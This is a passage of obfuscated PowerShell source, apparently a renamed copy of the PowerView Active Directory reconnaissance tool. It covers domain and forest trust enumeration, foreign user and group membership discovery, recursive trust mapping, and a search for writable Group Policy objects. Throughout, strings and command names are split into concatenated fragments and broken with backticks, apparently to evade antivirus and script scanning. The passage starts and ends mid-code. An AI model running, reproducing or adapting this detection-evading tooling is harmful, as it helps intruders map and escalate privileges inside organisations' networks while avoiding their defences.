
        [Parameter(ParameterSetName = "L`DaP")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [Parameter(ParameterSetName = "L`DAP")]
        [ValidateNotNullOrEmpty()]
        [Alias(('AD'+'SPath'))]
        [String]
        $SearchBase,

        [Parameter(ParameterSetName = "Ld`Ap")]
        [Parameter(ParameterSetName = "a`pI")]
        [ValidateNotNullOrEmpty()]
        [Alias(('DomainCo'+'ntro'+'lle'+'r'))]
        [String]
        $Server,

        [Parameter(ParameterSetName = "L`DAp")]
        [ValidateSet(('Ba'+'se'), ('One'+'Leve'+'l'), ('Sub'+'tre'+'e'))]
        [String]
        $SearchScope = ('Sub'+'tree'),

        [Parameter(ParameterSetName = "L`Dap")]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [Parameter(ParameterSetName = "lD`Ap")]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Parameter(ParameterSetName = "L`dap")]
        [Switch]
        $Tombstone,

        [Alias(('Re'+'tur'+'nOne'))]
        [Switch]
        $FindOne,

        [Parameter(ParameterSetName = "l`dAp")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $TrustAttributes = @{
            [uint32]('0x0000'+'0'+'001') = ('NON_TRA'+'NSI'+'TI'+'V'+'E')
            [uint32]('0x000'+'00'+'002') = ('U'+'PLEVE'+'L_'+'ONLY')
            [uint32]('0x00000'+'0'+'04') = ('F'+'I'+'LTER_SIDS')
            [uint32]('0x0000'+'0'+'0'+'08') = ('FO'+'REST_'+'TRAN'+'SITIVE')
            [uint32]('0x'+'00'+'0000'+'10') = ('CRO'+'SS_OR'+'GANI'+'ZATION')
            [uint32]('0x0'+'000002'+'0') = ('WIT'+'HI'+'N'+'_'+'FOREST')
            [uint32]('0x000'+'0004'+'0') = ('TREAT_A'+'S_'+'EXT'+'E'+'RNAL')
            [uint32]('0x0000'+'0'+'080') = ('TRUST'+'_'+'USES_RC4_E'+'NCRYPTIO'+'N')
            [uint32]('0x'+'0'+'0000100') = ('TRU'+'ST_'+'US'+'ES_'+'AE'+'S_KEYS')
            [uint32]('0x0'+'00'+'00200') = ('CROSS_ORGANIZAT'+'I'+'ON'+'_'+'NO'+'_'+'TG'+'T_DELEGAT'+'ION')
            [uint32]('0'+'x000004'+'00') = ('PI'+'M_TRUS'+'T')
        }

        $LdapSearcherArguments = @{}
        if ($PSBoundParameters[('Doma'+'in')]) { $LdapSearcherArguments[('Domai'+'n')] = $Domain }
        if ($PSBoundParameters[('LDAP'+'Fi'+'lter')]) { $LdapSearcherArguments[('LDAPFi'+'l'+'ter')] = $LDAPFilter }
        if ($PSBoundParameters[('Pro'+'pe'+'rties')]) { $LdapSearcherArguments[('Prop'+'erti'+'es')] = $Properties }
        if ($PSBoundParameters[('S'+'ea'+'rchBas'+'e')]) { $LdapSearcherArguments[('Se'+'ar'+'chBase')] = $SearchBase }
        if ($PSBoundParameters[('Serve'+'r')]) { $LdapSearcherArguments[('Ser'+'ver')] = $Server }
        if ($PSBoundParameters[('Sear'+'ch'+'Scope')]) { $LdapSearcherArguments[('Sea'+'rchS'+'co'+'pe')] = $SearchScope }
        if ($PSBoundParameters[('Resu'+'ltPag'+'eSize')]) { $LdapSearcherArguments[('Res'+'ultPageSi'+'ze')] = $ResultPageSize }
        if ($PSBoundParameters[('Server'+'TimeLim'+'i'+'t')]) { $LdapSearcherArguments[('Ser'+'v'+'erTimeLi'+'mi'+'t')] = $ServerTimeLimit }
        if ($PSBoundParameters[('T'+'ombst'+'one')]) { $LdapSearcherArguments[('T'+'ombst'+'one')] = $Tombstone }
        if ($PSBoundParameters[('Creden'+'t'+'ial')]) { $LdapSearcherArguments[('Creden'+'tia'+'l')] = $Credential }
    }

    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne ('A'+'PI')) {
            $NetSearcherArguments = @{}
            if ($Domain -and $Domain.Trim() -ne '') {
                $SourceDomain = $Domain
            }
            else {
                if ($PSBoundParameters[('Cr'+'edentia'+'l')]) {
                    $SourceDomain = (&('Get-'+'Dom'+'ain') -Credential $Credential).Name
                }
                else {
                    $SourceDomain = (&('G'+'e'+'t-Dom'+'ain')).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne ('NE'+'T')) {
            if ($Domain -and $Domain.Trim() -ne '') {
                $SourceDomain = $Domain
            }
            else {
                $SourceDomain = $Env:USERDNSDOMAIN
            }
        }

        if ($PsCmdlet.ParameterSetName -eq ('LD'+'AP')) {
            $TrustSearcher = &('Get-Do'+'m'+'ainSe'+'ar'+'ch'+'er') @LdapSearcherArguments
            $SourceSID = &('Get'+'-D'+'om'+'ainSI'+'D') @NetSearcherArguments

            if ($TrustSearcher) {

                $TrustSearcher.Filter = ('(ob'+'je'+'c'+'tClas'+'s=trust'+'edDomain)')

                if ($PSBoundParameters[('Fi'+'n'+'dOne')]) { $Results = $TrustSearcher.FindOne() }
                else { $Results = $TrustSearcher.FindAll() }
                $Results | &('Wh'+'e'+'re'+'-Object') {$_} | &('F'+'orE'+'ach-Ob'+'ject') {
                    $Props = $_.Properties
                    $DomainTrust = &('N'+'ew'+'-'+'Object') PSObject

                    $TrustAttrib = @()
                    $TrustAttrib += $TrustAttributes.Keys | &('Wh'+'ere-'+'Object') { $Props.trustattributes[0] -band $_ } | &('Fo'+'rEach-Obje'+'ct') { $TrustAttributes[$_] }

                    $Direction = Switch ($Props.trustdirection) {
                        0 { ('Disa'+'bled') }
                        1 { ('In'+'bound') }
                        2 { ('Ou'+'tbound') }
                        3 { ('Bi'+'d'+'irectional') }
                    }

                    $TrustType = Switch ($Props.trusttype) {
                        1 { ('WINDO'+'W'+'S_NON_ACT'+'IVE'+'_D'+'IRE'+'CTORY') }
                        2 { ('WINDOWS_ACTIVE'+'_D'+'IR'+'ECTOR'+'Y') }
                        3 { ('MI'+'T') }
                    }

                    $Distinguishedname = $Props.distinguishedname[0]
                    $SourceNameIndex = $Distinguishedname.IndexOf(('D'+'C='))
                    if ($SourceNameIndex) {
                        $SourceDomain = $($Distinguishedname.SubString($SourceNameIndex)) -replace ('DC'+'='),'' -replace ',','.'
                    }
                    else {
                        $SourceDomain = ""
                    }

                    $TargetNameIndex = $Distinguishedname.IndexOf((',CN'+'=Sy'+'s'+'tem'))
                    if ($SourceNameIndex) {
                        $TargetDomain = $Distinguishedname.SubString(3, $TargetNameIndex-3)
                    }
                    else {
                        $TargetDomain = ""
                    }

                    $ObjectGuid = &('New'+'-'+'Objec'+'t') Guid @(,$Props.objectguid[0])
                    $TargetSID = (&('N'+'ew'+'-O'+'bject') System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value

                    $DomainTrust | &('Add-M'+'e'+'m'+'ber') Noteproperty ('Source'+'Na'+'me') $SourceDomain
                    $DomainTrust | &('A'+'dd-'+'Membe'+'r') Noteproperty ('T'+'arge'+'tName') $Props.name[0]
                    $DomainTrust | &('Ad'+'d'+'-Mem'+'ber') Noteproperty ('Trust'+'Ty'+'pe') $TrustType
                    $DomainTrust | &('Ad'+'d-'+'M'+'ember') Noteproperty ('T'+'rustAttribu'+'t'+'es') $($TrustAttrib -join ',')
                    $DomainTrust | &('Add-'+'M'+'em'+'ber') Noteproperty ('Trus'+'t'+'Direction') "$Direction"
                    $DomainTrust | &('Ad'+'d-Me'+'m'+'ber') Noteproperty ('W'+'he'+'nCreated') $Props.whencreated[0]
                    $DomainTrust | &('A'+'dd-Me'+'mber') Noteproperty ('When'+'Ch'+'anged') $Props.whenchanged[0]
                    $DomainTrust.PSObject.TypeNames.Insert(0, ('PowerBla'+'.Domai'+'nTr'+'ust.LD'+'AP'))
                    $DomainTrust
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        &('Write-V'+'erb'+'ose') ('[Get-'+'Domain'+'Trus'+'t] '+'Erro'+'r '+'dis'+'posi'+'ng'+' '+'o'+'f '+'t'+'he '+'Resu'+'l'+'ts '+'ob'+'je'+'ct: '+"$_")
                    }
                }
                $TrustSearcher.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq ('A'+'PI')) {
            if ($PSBoundParameters[('Se'+'r'+'ver')]) {
                $TargetDC = $Server
            }
            elseif ($Domain -and $Domain.Trim() -ne '') {
                $TargetDC = $Domain
            }
            else {
                $TargetDC = $Null
            }

            $PtrInfo = [IntPtr]::Zero

            $Flags = 63
            $DomainCount = 0

            $Result = $Netapi32::DsEnumerateDomainTrusts($TargetDC, $Flags, [ref]$PtrInfo, [ref]$DomainCount)

            $Offset = $PtrInfo.ToInt64()

            if (($Result -eq 0) -and ($Offset -gt 0)) {

                $Increment = $DS_DOMAIN_TRUSTS::GetSize()

                for ($i = 0; ($i -lt $DomainCount); $i++) {
                    $NewIntPtr = &('New'+'-Objec'+'t') System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $DS_DOMAIN_TRUSTS

                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment

                    $SidString = ''
                    $Result = $Advapi32::ConvertSidToStringSid($Info.DomainSid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if ($Result -eq 0) {
                        &('Write'+'-Verbos'+'e') "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                    }
                    else {
                        $DomainTrust = &('N'+'e'+'w-Object') PSObject
                        $DomainTrust | &('A'+'dd'+'-Me'+'mber') Noteproperty ('Sou'+'rce'+'Name') $SourceDomain
                        $DomainTrust | &('Add'+'-Membe'+'r') Noteproperty ('Target'+'Nam'+'e') $Info.DnsDomainName
                        $DomainTrust | &('Add'+'-'+'M'+'ember') Noteproperty ('Targ'+'etNetb'+'iosNa'+'me') $Info.NetbiosDomainName
                        $DomainTrust | &('Ad'+'d-Me'+'mber') Noteproperty ('Flag'+'s') $Info.Flags
                        $DomainTrust | &('Add-Me'+'m'+'ber') Noteproperty ('P'+'arent'+'Index') $Info.ParentIndex
                        $DomainTrust | &('Add-Memb'+'e'+'r') Noteproperty ('Tr'+'u'+'stType') $Info.TrustType
                        $DomainTrust | &('Add'+'-Membe'+'r') Noteproperty ('TrustA'+'tt'+'r'+'ibute'+'s') $Info.TrustAttributes
                        $DomainTrust | &('Add-M'+'emb'+'er') Noteproperty ('Tar'+'get'+'Si'+'d') $SidString
                        $DomainTrust | &('A'+'dd-Membe'+'r') Noteproperty ('Targe'+'t'+'G'+'uid') $Info.DomainGuid
                        $DomainTrust.PSObject.TypeNames.Insert(0, ('Po'+'werBla.DomainTru'+'st'+'.A'+'PI'))
                        $DomainTrust
                    }
                }
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                &('Write'+'-Ve'+'rbos'+'e') "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
        else {
            $FoundDomain = &('Ge'+'t-Domai'+'n') @NetSearcherArguments
            if ($FoundDomain) {
                $FoundDomain.GetAllTrustRelationships() | &('F'+'orEac'+'h-Objec'+'t') {
                    $_.PSObject.TypeNames.Insert(0, ('Powe'+'rBla.'+'D'+'om'+'a'+'inTrust.NET'))
                    $_
                }
            }
        }
    }
}


function Get-ForestTrust {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSSho'+'ul'+'dP'+'rocess'), '')]
    [OutputType(('Powe'+'rBla.For'+'estTru'+'s'+'t.NET'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Nam'+'e'))]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $NetForestArguments = @{}
        if ($PSBoundParameters[('Fores'+'t')]) { $NetForestArguments[('Fo'+'re'+'st')] = $Forest }
        if ($PSBoundParameters[('C'+'reden'+'tia'+'l')]) { $NetForestArguments[('Cr'+'edent'+'ial')] = $Credential }

        $FoundForest = &('Get-'+'For'+'est') @NetForestArguments

        if ($FoundForest) {
            $FoundForest.GetAllTrustRelationships() | &('ForEa'+'c'+'h-Ob'+'ject') {
                $_.PSObject.TypeNames.Insert(0, ('P'+'owe'+'rBla.F'+'ore'+'stT'+'rust.N'+'ET'))
                $_
            }
        }
    }
}


function Get-DomainForeignUser {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSShou'+'ld'+'Proc'+'es'+'s'), '')]
    [OutputType(('Powe'+'r'+'Bla.Fo'+'reign'+'U'+'ser'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Na'+'me'))]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('F'+'ilter'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(('ADS'+'P'+'ath'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('D'+'omain'+'Control'+'ler'))]
        [String]
        $Server,

        [ValidateSet(('Ba'+'se'), ('OneLe'+'vel'), ('S'+'ubtree'))]
        [String]
        $SearchScope = ('Subt'+'r'+'ee'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet(('D'+'acl'), ('G'+'roup'), ('N'+'one'), ('Own'+'er'), ('Sac'+'l'))]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        $SearcherArguments[('LDAPF'+'ilte'+'r')] = ('(memb'+'erof=*'+')')
        if ($PSBoundParameters[('Doma'+'i'+'n')]) { $SearcherArguments[('D'+'o'+'main')] = $Domain }
        if ($PSBoundParameters[('Prope'+'rt'+'ies')]) { $SearcherArguments[('Pr'+'op'+'erties')] = $Properties }
        if ($PSBoundParameters[('SearchBa'+'s'+'e')]) { $SearcherArguments[('Sea'+'rchBa'+'se')] = $SearchBase }
        if ($PSBoundParameters[('Serv'+'er')]) { $SearcherArguments[('S'+'er'+'ver')] = $Server }
        if ($PSBoundParameters[('Sear'+'c'+'hSco'+'pe')]) { $SearcherArguments[('SearchSc'+'o'+'pe')] = $SearchScope }
        if ($PSBoundParameters[('Res'+'ultP'+'ageSiz'+'e')]) { $SearcherArguments[('Resu'+'ltPa'+'g'+'eSize')] = $ResultPageSize }
        if ($PSBoundParameters[('Serv'+'erTim'+'eLimi'+'t')]) { $SearcherArguments[('S'+'er'+'ver'+'TimeLimit')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Secur'+'ityMa'+'sks')]) { $SearcherArguments[('Secur'+'ityMas'+'ks')] = $SecurityMasks }
        if ($PSBoundParameters[('T'+'omb'+'stone')]) { $SearcherArguments[('Tom'+'b'+'stone')] = $Tombstone }
        if ($PSBoundParameters[('C'+'red'+'ential')]) { $SearcherArguments[('Credent'+'i'+'al')] = $Credential }
        if ($PSBoundParameters[('R'+'aw')]) { $SearcherArguments[('Ra'+'w')] = $Raw }
    }

    PROCESS {
        &('Ge'+'t-Do'+'ma'+'in'+'User') @SearcherArguments  | &('ForEa'+'ch'+'-Ob'+'ject') {
            ForEach ($Membership in $_.memberof) {
                $Index = $Membership.IndexOf(('D'+'C='))
                if ($Index) {

                    $GroupDomain = $($Membership.SubString($Index)) -replace ('DC'+'='),'' -replace ',','.'
                    $UserDistinguishedName = $_.distinguishedname
                    $UserIndex = $UserDistinguishedName.IndexOf(('DC'+'='))
                    $UserDomain = $($_.distinguishedname.SubString($UserIndex)) -replace ('DC'+'='),'' -replace ',','.'

                    if ($GroupDomain -ne $UserDomain) {
                        $GroupName = $Membership.Split(',')[0].split('=')[1]
                        $ForeignUser = &('New-O'+'bjec'+'t') PSObject
                        $ForeignUser | &('Add-'+'Mem'+'ber') Noteproperty ('UserDom'+'ai'+'n') $UserDomain
                        $ForeignUser | &('Add-Me'+'mb'+'er') Noteproperty ('UserNa'+'me') $_.samaccountname
                        $ForeignUser | &('A'+'dd'+'-Member') Noteproperty ('Us'+'er'+'Disti'+'nguishedNa'+'me') $_.distinguishedname
                        $ForeignUser | &('Add-'+'M'+'embe'+'r') Noteproperty ('Group'+'Do'+'main') $GroupDomain
                        $ForeignUser | &('A'+'d'+'d-Mem'+'ber') Noteproperty ('Gr'+'oupN'+'ame') $GroupName
                        $ForeignUser | &('Ad'+'d-Me'+'mber') Noteproperty ('GroupDi'+'s'+'t'+'inguish'+'edN'+'am'+'e') $Membership
                        $ForeignUser.PSObject.TypeNames.Insert(0, ('Pow'+'er'+'Bla'+'.F'+'orei'+'gnUs'+'er'))
                        $ForeignUser
                    }
                }
            }
        }
    }
}


function Get-DomainForeignGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('P'+'SSh'+'o'+'uld'+'Process'), '')]
    [OutputType(('PowerBla.'+'Fo'+'reign'+'Group'+'M'+'ember'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Nam'+'e'))]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('F'+'ilter'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(('ADSPat'+'h'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('D'+'omain'+'Controlle'+'r'))]
        [String]
        $Server,

        [ValidateSet(('Ba'+'se'), ('OneLe'+'v'+'el'), ('Sub'+'tre'+'e'))]
        [String]
        $SearchScope = ('S'+'ubtree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet(('Da'+'cl'), ('G'+'roup'), ('N'+'one'), ('Own'+'er'), ('Sac'+'l'))]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        $SearcherArguments[('LDAPFi'+'l'+'ter')] = ('(m'+'e'+'mb'+'er=*)')
        if ($PSBoundParameters[('D'+'oma'+'in')]) { $SearcherArguments[('Dom'+'ai'+'n')] = $Domain }
        if ($PSBoundParameters[('P'+'ro'+'per'+'ties')]) { $SearcherArguments[('Prope'+'rti'+'es')] = $Properties }
        if ($PSBoundParameters[('S'+'e'+'archBase')]) { $SearcherArguments[('Se'+'ar'+'chBase')] = $SearchBase }
        if ($PSBoundParameters[('Serve'+'r')]) { $SearcherArguments[('Serve'+'r')] = $Server }
        if ($PSBoundParameters[('Se'+'arc'+'hS'+'cope')]) { $SearcherArguments[('SearchSc'+'o'+'pe')] = $SearchScope }
        if ($PSBoundParameters[('Resu'+'ltP'+'ageSi'+'ze')]) { $SearcherArguments[('Res'+'ultPag'+'eSize')] = $ResultPageSize }
        if ($PSBoundParameters[('S'+'e'+'rverTimeLimit')]) { $SearcherArguments[('S'+'erv'+'erTimeL'+'imi'+'t')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Secu'+'rit'+'yMasks')]) { $SearcherArguments[('Secur'+'it'+'yMa'+'s'+'ks')] = $SecurityMasks }
        if ($PSBoundParameters[('Tombs'+'t'+'one')]) { $SearcherArguments[('T'+'ombston'+'e')] = $Tombstone }
        if ($PSBoundParameters[('Cr'+'edenti'+'al')]) { $SearcherArguments[('C'+'redenti'+'al')] = $Credential }
        if ($PSBoundParameters[('R'+'aw')]) { $SearcherArguments[('R'+'aw')] = $Raw }
    }

    PROCESS {
        $ExcludeGroups = @(('U'+'sers'), ('Doma'+'in Use'+'rs'), ('Gue'+'sts'))

        &('G'+'et-'+'D'+'o'+'mainGroup') @SearcherArguments | &('Whe'+'re-'+'O'+'bject') { $ExcludeGroups -notcontains $_.samaccountname } | &('For'+'E'+'a'+'ch-Obje'+'ct') {
            $GroupName = $_.samAccountName
            $GroupDistinguishedName = $_.distinguishedname
            $GroupDomain = $GroupDistinguishedName.SubString($GroupDistinguishedName.IndexOf(('D'+'C='))) -replace ('D'+'C='),'' -replace ',','.'

            $_.member | &('F'+'o'+'rEach-Obj'+'ec'+'t') {
                $MemberDomain = $_.SubString($_.IndexOf(('DC'+'='))) -replace ('DC'+'='),'' -replace ',','.'
                if (($_ -match ('C'+'N=S-1-5-21'+'.*-'+'.*')) -or ($GroupDomain -ne $MemberDomain)) {
                    $MemberDistinguishedName = $_
                    $MemberName = $_.Split(',')[0].split('=')[1]

                    $ForeignGroupMember = &('N'+'ew'+'-Object') PSObject
                    $ForeignGroupMember | &('Add-Mem'+'b'+'er') Noteproperty ('G'+'r'+'oupDomai'+'n') $GroupDomain
                    $ForeignGroupMember | &('Add-Mem'+'be'+'r') Noteproperty ('GroupNam'+'e') $GroupName
                    $ForeignGroupMember | &('Add-Me'+'mb'+'er') Noteproperty ('Gro'+'upDistin'+'guished'+'Na'+'me') $GroupDistinguishedName
                    $ForeignGroupMember | &('Ad'+'d-Mem'+'ber') Noteproperty ('Mem'+'b'+'erDomain') $MemberDomain
                    $ForeignGroupMember | &('A'+'dd-M'+'ember') Noteproperty ('M'+'embe'+'rName') $MemberName
                    $ForeignGroupMember | &('Add-Memb'+'e'+'r') Noteproperty ('Me'+'mber'+'Distingu'+'is'+'hedN'+'ame') $MemberDistinguishedName
                    $ForeignGroupMember.PSObject.TypeNames.Insert(0, ('PowerBla.For'+'e'+'i'+'gnGroup'+'M'+'embe'+'r'))
                    $ForeignGroupMember
                }
            }
        }
    }
}


function Get-DomainTrustMapping {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSSh'+'o'+'u'+'ldProcess'), '')]
    [OutputType(('Po'+'wer'+'Bla.D'+'o'+'m'+'ain'+'Tru'+'st.NET'))]
    [OutputType(('Power'+'Bla.Domai'+'nT'+'rus'+'t.LDA'+'P'))]
    [OutputType(('PowerBla.Domai'+'nTr'+'u'+'st.A'+'PI'))]
    [CmdletBinding(DefaultParameterSetName = {'L'+'DAP'})]
    Param(
        [Parameter(ParameterSetName = "a`pi")]
        [Switch]
        $API,

        [Parameter(ParameterSetName = "N`ET")]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = "l`Dap")]
        [ValidateNotNullOrEmpty()]
        [Alias(('Fil'+'ter'))]
        [String]
        $LDAPFilter,

        [Parameter(ParameterSetName = "lD`AP")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [Parameter(ParameterSetName = "L`dap")]
        [ValidateNotNullOrEmpty()]
        [Alias(('ADSP'+'a'+'th'))]
        [String]
        $SearchBase,

        [Parameter(ParameterSetName = "L`dAp")]
        [Parameter(ParameterSetName = "a`pI")]
        [ValidateNotNullOrEmpty()]
        [Alias(('D'+'oma'+'in'+'Controller'))]
        [String]
        $Server,

        [Parameter(ParameterSetName = "l`dAp")]
        [ValidateSet(('Ba'+'se'), ('OneLev'+'el'), ('Subt'+'re'+'e'))]
        [String]
        $SearchScope = ('Sub'+'tre'+'e'),

        [Parameter(ParameterSetName = "L`Dap")]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [Parameter(ParameterSetName = "LD`Ap")]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Parameter(ParameterSetName = "L`DAP")]
        [Switch]
        $Tombstone,

        [Parameter(ParameterSetName = "l`daP")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $SeenDomains = @{}

    $Domains = &('Ne'+'w-Obje'+'ct') System.Collections.Stack

    $DomainTrustArguments = @{}
    if ($PSBoundParameters[('A'+'PI')]) { $DomainTrustArguments[('A'+'PI')] = $API }
    if ($PSBoundParameters[('NE'+'T')]) { $DomainTrustArguments[('NE'+'T')] = $NET }
    if ($PSBoundParameters[('LDAPF'+'il'+'ter')]) { $DomainTrustArguments[('LDAPF'+'i'+'lter')] = $LDAPFilter }
    if ($PSBoundParameters[('Prop'+'e'+'rties')]) { $DomainTrustArguments[('P'+'rop'+'ertie'+'s')] = $Properties }
    if ($PSBoundParameters[('Sea'+'rchB'+'ase')]) { $DomainTrustArguments[('Search'+'B'+'ase')] = $SearchBase }
    if ($PSBoundParameters[('Serve'+'r')]) { $DomainTrustArguments[('Se'+'rver')] = $Server }
    if ($PSBoundParameters[('Searc'+'hS'+'cope')]) { $DomainTrustArguments[('Se'+'a'+'rchSc'+'ope')] = $SearchScope }
    if ($PSBoundParameters[('Resu'+'ltP'+'ageSi'+'ze')]) { $DomainTrustArguments[('R'+'esultP'+'ageSi'+'ze')] = $ResultPageSize }
    if ($PSBoundParameters[('Se'+'rverTimeL'+'i'+'mit')]) { $DomainTrustArguments[('ServerTi'+'meLimi'+'t')] = $ServerTimeLimit }
    if ($PSBoundParameters[('Tombs'+'t'+'on'+'e')]) { $DomainTrustArguments[('To'+'mbs'+'tone')] = $Tombstone }
    if ($PSBoundParameters[('C'+'re'+'denti'+'al')]) { $DomainTrustArguments[('C'+'redentia'+'l')] = $Credential }

    if ($PSBoundParameters[('Crede'+'nt'+'ial')]) {
        $CurrentDomain = (&('Get-'+'Dom'+'ain') -Credential $Credential).Name
    }
    else {
        $CurrentDomain = (&('Ge'+'t'+'-Domain')).Name
    }
    $Domains.Push($CurrentDomain)

    while($Domains.Count -ne 0) {

        $Domain = $Domains.Pop()

        if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {

            &('Wr'+'i'+'t'+'e-Verbose') ('[Get-'+'DomainT'+'r'+'ustMapp'+'i'+'ng] '+'Enumera'+'ti'+'ng '+'tr'+'us'+'ts '+'f'+'or '+'dom'+'ain'+': '+"'$Domain'")

            $Null = $SeenDomains.Add($Domain, '')

            try {
                $DomainTrustArguments[('Dom'+'ain')] = $Domain
                $Trusts = &('G'+'et-'+'Doma'+'in'+'Trust') @DomainTrustArguments

                if ($Trusts -isnot [System.Array]) {
                    $Trusts = @($Trusts)
                }

                if ($PsCmdlet.ParameterSetName -eq ('NE'+'T')) {
                    $ForestTrustArguments = @{}
                    if ($PSBoundParameters[('Fo'+'re'+'st')]) { $ForestTrustArguments[('Fores'+'t')] = $Forest }
                    if ($PSBoundParameters[('Cr'+'edenti'+'al')]) { $ForestTrustArguments[('Cr'+'e'+'dential')] = $Credential }
                    $Trusts += &('G'+'et'+'-ForestTr'+'u'+'st') @ForestTrustArguments
                }

                if ($Trusts) {
                    if ($Trusts -isnot [System.Array]) {
                        $Trusts = @($Trusts)
                    }

                    ForEach ($Trust in $Trusts) {
                        if ($Trust.SourceName -and $Trust.TargetName) {
                            $Null = $Domains.Push($Trust.TargetName)
                            $Trust
                        }
                    }
                }
            }
            catch {
                &('Wr'+'ite-Ver'+'bose') ('[Get-Dom'+'ainTr'+'us'+'tMap'+'ping] '+'Erro'+'r: '+"$_")
            }
        }
    }
}


function Get-GPODelegation {


    [CmdletBinding()]
    Param (
        [String]
        $GPOName = '*',

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    $Exclusions = @(('SYST'+'E'+'M'),('Domai'+'n A'+'dmi'+'ns'),('Enterp'+'r'+'ise '+'Admins'))

    $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $DomainList = @($Forest.Domains)
    $Domains = $DomainList | &('fore'+'ac'+'h') { $_.GetDirectoryEntry() }
    foreach ($Domain in $Domains) {
        $Filter = "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
        $Searcher = &('New'+'-Obje'+'ct') System.DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = $Domain
        $Searcher.Filter = $Filter
        $Searcher.PageSize = $PageSize
        $Searcher.SearchScope = ('S'+'ubt'+'ree')
        $listGPO = $Searcher.FindAll()
        foreach ($gpo in $listGPO){
            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | &('?') {$_.ActiveDirectoryRights -match ('W'+'rite') -and $_.AccessControlType -eq ('Allo'+'w') -and  $Exclusions -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne ('CRE'+'ATOR OWN'+'ER')}
        if ($ACL -ne $null){
            $GpoACL = &('N'+'ew-Obj'+'ec'+'t') psobject
            $GpoACL | &('Add'+'-'+'Mem'+'ber') Noteproperty ('AD'+'SPat'+'h') $gpo.Properties.adspath
            $GpoACL | &('Add'+'-Mem'+'ber') Noteproperty ('GP'+'ODisplay'+'Name') $gpo.Properties.displayname
            $GpoACL | &('Add-Me'+'mbe'+'r') Noteproperty ('Ide'+'n'+'tityRefer'+'en'+'ce') $ACL.IdentityReference
            $GpoACL | &('Ad'+'d-M'+'ember') Noteproperty ('Ac'+'tiveD'+'irectory'+'R'+'ight'+'s') $ACL.ActiveDirectoryRights
            $GpoACL
        }
        }
    }
}



$Mod = &('New-In'+'M'+'emoryMod'+'ule') -ModuleName Win32


$SamAccountTypeEnum = &('psenu'+'m') $Mod PowerBla.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   ('0x000'+'000'+'00')
    GROUP_OBJECT                    =   ('0x10'+'0000'+'00')
